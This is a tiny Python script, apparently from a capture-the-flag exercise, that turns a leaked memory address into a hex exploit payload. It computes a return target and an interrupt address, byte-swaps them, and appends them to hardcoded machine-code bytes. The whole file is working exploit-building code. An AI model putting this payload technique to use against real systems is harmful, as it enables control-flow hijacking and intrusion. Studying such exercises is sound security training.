import sys
leaked = int(sys.argv[1],16)
call_r14 = "%04x"%(leaked - 8)
int_addr = "%04x"%(leaked + 0x1a8)
call_r14 = call_r14[2:4] + call_r14[0:2]
int_addr = int_addr[2:4] + int_addr[0:2]
print("3f407f003040" + int_addr + call_r14)
